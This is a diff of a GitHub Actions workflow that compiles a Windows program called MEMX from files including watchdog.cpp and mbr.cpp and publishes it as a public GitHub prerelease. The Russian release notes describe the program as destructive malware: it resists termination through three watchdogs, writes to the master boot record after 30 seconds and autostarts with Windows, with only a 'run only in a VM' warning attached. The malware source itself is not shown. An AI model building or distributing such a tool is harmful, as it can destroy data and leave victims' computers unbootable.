@@ -1,79 +1,46 @@
 name: Build MEMX
 
-env:
-  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
-
 on:
   push:
     branches: [ main ]
   workflow_dispatch:
 
+env:
+  FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: true
+
 jobs:
   build:
     runs-on: windows-2022
-    timeout-minutes: 40
 
     steps:
       - uses: actions/checkout@v4
 
       - name: Setup MSVC
-        shell: powershell
-        run: |
-          $vcvarsPaths = @(
-            "C:\Program Files\Microsoft Visual Studio\2022\Enterprise\VC\Auxiliary\Build\vcvars64.bat",
-            "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat",
-            "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
-          )
-          
-          $vcvars = $null
-          foreach ($path in $vcvarsPaths) {
-            if (Test-Path $path) {
-              $vcvars = $path
-              break
-            }
-          }
-          
-          if (-not $vcvars) {
-            Write-Host "[FAIL] MSVC not found"
-            exit 1
-          }
-          
-          "VCVARS=$vcvars" >> $env:GITHUB_ENV
-          Write-Host "[OK] MSVC found: $vcvars"
+        uses: ilammy/msvc-dev-cmd@v1
 
-      - name: Build MEMX.exe
+      - name: Build memx.exe
         shell: cmd
         run: |
-          call "%VCVARS%"
-          cl.exe /nologo /MT /O2 /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib /SUBSYSTEM:WINDOWS /OUT:memx.exe
-          
-          if exist memx.exe (
-            echo [OK] memx.exe built
-          ) else (
-            echo [FAIL] memx.exe build failed
-            exit /b 1
-          )
+          cl /EHsc /std:c++17 main.cpp effects.cpp watchdog.cpp mbr.cpp ^
+          /link user32.lib gdi32.lib winmm.lib shell32.lib ole32.lib uuid.lib advapi32.lib ^
+          /SUBSYSTEM:WINDOWS /OUT:memx.exe
 
-      - name: Package as Self-Extracting Archive (SFX)
-        shell: powershell
-        run: |
-          choco install 7zip -y --no-progress
-          
-          # Create SFX archive
-          & "C:\Program Files\7-Zip\7z.exe" a -sfx -mmt -mx9 "memx_sfx.exe" .\memx.exe
-          
-          if (Test-Path "memx_sfx.exe") {
-            Write-Host "[OK] SFX created: memx_sfx.exe"
-          } else {
-            Write-Host "[FAIL] SFX creation failed"
-            exit 1
-          }
-
-      - name: Upload Artifacts
-        uses: actions/upload-artifact@v4
+      - name: Create Release
+        uses: softprops/action-gh-release@v1
         with:
-          name: memx
-          path: |
-            memx.exe
-            memx_sfx.exe
-          retention-days: 90
+          files: memx.exe
+          tag_name: memx-latest
+          name: "MEMX — последняя сборка"
+          body: |
+            ## 🔥 MEMX.exe
+            
+            - 29 ультра-эффектов
+            - Защита от завершения (3 watchdog)
+            - Запись в MBR через 30 секунд
+            - Автозапуск при старте Windows
+            
+            **Запускай ТОЛЬКО в виртуалке!**
+          draft: false
+          prerelease: true
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
